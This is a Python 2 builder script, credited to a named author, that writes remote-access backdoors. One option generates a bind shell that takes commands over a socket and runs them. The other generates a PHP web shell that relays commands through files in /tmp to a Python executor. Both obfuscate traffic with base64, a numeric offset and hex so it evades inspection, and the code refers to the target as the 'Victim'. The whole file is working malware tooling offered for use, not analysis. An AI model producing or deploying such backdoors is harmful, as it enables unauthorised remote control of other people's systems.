#programed by Majid AL Maashari
#Email : omanras@gmail.com


method = raw_input("Please enter (a) for bind shell or (b) for linker shell:")
if method == "a":
	file_name = raw_input("Enter file name: ")
	bind_port = raw_input("Enter port number: ")
	random = raw_input("Enter random number: ")


	data = """
	import subprocess
	import socket
	import sys
	import os
	import base64
	from base64 import b64encode, b64decode

	host = "127.0.0.1" #! address to bind on.
	port = int("""+bind_port+""")
	random = int("""+random+""")





	while True:
		try:
			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.bind((host,port))
			s.listen(4)
			while True:
				c,addr=s.accept()
				
		
				for tym in range(0,50):
					data=c.recv(1024)

					
					cipher"""+random+""" = b64decode(data)
					cipher"""+random+""" = int(cipher"""+random+""") - random
					dechex"""+random+"""= '{0:x}'.format(int(cipher"""+random+"""))
					try :
						hexdecode"""+random+""" = dechex"""+random+""".decode('hex')
					except:
						hexdecode"""+random+""" = bytes.fromhex(dechex"""+random+""")
						hexdecode"""+random+""" = str(hexdecode"""+random+""")[1:]
						
			
			
					a = ""
					for line in os.popen(hexdecode"""+random+"""):
						
						a = a + line
						
					try :
						hexcode"""+random+"""= a.encode('hex')
					except:
						hexcode"""+random+"""= a.encode().hex()

					hexdec"""+random+""" = int(hexcode"""+random+""", 16)
					encoded_cipher = hexdec"""+random+""" + random
					try:
						encode = b64encode(str(encoded_cipher))
					except:
						encode = base64.b64encode(str(encoded_cipher).encode())	
					c.send(encode)
		except KeyboardInterrupt:
			c.send("[ctrl+c] server forcely closed by Victim.")
			s.close()
			sys.exit(1)
	"""
	f = open(file_name, "w")
	f.write(data)
	f.close()
	print "Done!!"

if method == "b":
	file_php1 = raw_input("Enter php file name: ")
	file_py1 = raw_input("Enter python file name:")
	random = raw_input("Enter random number:")

	data1 = """

 <html>
<body>

<form action='"""+file_php1+"""' method="post">
command: <input type="text" name="cmd"><br>
<input type="submit">
</form>

</body>
</html> 


<?php
 
 $myfile = fopen("/tmp/commands.txt", "w") or die("Unable to open file!");
 $txt = $_POST["cmd"];
 fwrite($myfile, $txt);
 fclose($myfile);

 echo "<!--"; include("/tmp/results.txt"); echo "-->" ;

?>
	"""
	f = open(file_php1, "w")
	f.write(data1)
	f.close()
	data2 = """
import os
import sys
from base64 import b64encode, b64decode
import base64
import binascii

random = """+random+"""
while True:
    filename1 = "/tmp/commands.txt"
    filename2 = "/tmp/results.txt"
    f = open(filename1,"r")
    data = f.read()
    f.close()
    if data:
        try:
            cipher = b64decode(data)
            cipher = int(cipher) - random
            dechex = '{0:x}'.format(int(cipher))
            hexdecode = dechex.decode('hex')
            #print(hexdecode)
            results = os.popen(hexdecode).read()
            f2 = open(filename1, "w")
            f2.write("")
            #print(results)
            #random = int(random)
            hexcode= results.encode('hex')
            hexdec = int(hexcode, 16)
            encoded_cipher = hexdec + random
            encode = b64encode(str(encoded_cipher))  
            f3 = open(filename2,"w")
            f3.write(encode)
            f3.close()
        except:
            pass  
	"""
	f = open(file_py1, "w")
	f.write(data2)
	f.close()
	print "Done!!"
